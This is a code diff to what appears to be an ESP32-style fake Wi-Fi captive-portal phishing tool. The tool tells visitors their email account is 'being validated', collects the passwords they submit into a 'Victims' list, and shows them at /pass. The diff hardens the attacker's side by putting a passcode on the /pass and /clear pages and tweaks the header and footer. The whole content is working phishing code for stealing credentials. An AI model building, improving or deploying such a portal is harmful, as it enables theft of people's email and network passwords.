@@ -12,8 +12,9 @@ const char* POST_TITLE = "Validating...";
 const char* POST_BODY = "Your Email account is being validated. Please wait up to 3 minutes for device connection.<br>Thank you.";
 const char* PASS_TITLE = "Victims";
 const char* CLEAR_TITLE = "Cleared";
+const char* HEADER_TITLE = "WiFi";
 
-//System Settings
+// System Settings
 const byte HTTP_CODE = 200;
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
@@ -24,6 +25,9 @@ unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
 DNSServer dnsServer;
 WebServer webServer(80);
 
+// Set the password for accessing /pass and /clear
+const String passcode = "yourpassword";  // Change this to your desired password
+
 String input(String argName) {
   String a = webServer.arg(argName);
   a.replace("<", "&lt;");
@@ -33,11 +37,11 @@ String input(String argName) {
 }
 
 String footer() {
-  return "<br><footer><div><center><p>Copyright&#169; 2023 | All rights reserved.</p></center></div></footer>";
+  return "<br><footer><div><center><p>Copyright&#169; 2025 | All rights reserved.</p></center></div></footer>";
 }
 
 String header(String t) {
-  String a = String(SSID_NAME);
+  String a = String(HEADER_TITLE);
 
   String CSS = "#login-text { color: #808080;}"
                "header h1 { color: #ffffff; }"
@@ -62,7 +66,6 @@ String header(String t) {
   return h;
 }
 
-
 String pass() {
   return header(PASS_TITLE) + "<ol>" + Victims + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
 }
@@ -86,6 +89,14 @@ String clear() {
   return header(CLEAR_TITLE) + "<div><p>The Victims list has been cleared.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
 }
 
+// Page to enter password for accessing /pass and /clear
+String passLogin(String target) {
+  return header("Password Required") + 
+         "<div><form action=/" + target + " method=post>" +
+         "<b class=username-label> Enter Password: </b> <center> <input type=password name=password placeholder=password></center>" +
+         "<center><input type=submit value=Submit></center></form></div>" + footer();
+}
+
 void setup() {
   bootTime = lastActivity = millis();
 
@@ -99,12 +110,22 @@ void setup() {
     webServer.send(HTTP_CODE, "text/html", posted());
   });
 
+  // Add password protection for /pass page
   webServer.on("/pass", []() {
-    webServer.send(HTTP_CODE, "text/html", pass());
+    if (webServer.hasArg("password") && webServer.arg("password") == passcode) {
+      webServer.send(HTTP_CODE, "text/html", pass());
+    } else {
+      webServer.send(HTTP_CODE, "text/html", passLogin("pass"));
+    }
   });
 
+  // Add password protection for /clear page
   webServer.on("/clear", []() {
-    webServer.send(HTTP_CODE, "text/html", clear());
+    if (webServer.hasArg("password") && webServer.arg("password") == passcode) {
+      webServer.send(HTTP_CODE, "text/html", clear());
+    } else {
+      webServer.send(HTTP_CODE, "text/html", passLogin("clear"));
+    }
   });
 
   webServer.onNotFound([]() {
@@ -113,7 +134,6 @@ void setup() {
   });
 
   webServer.begin();
-
 }
 
 void loop() {
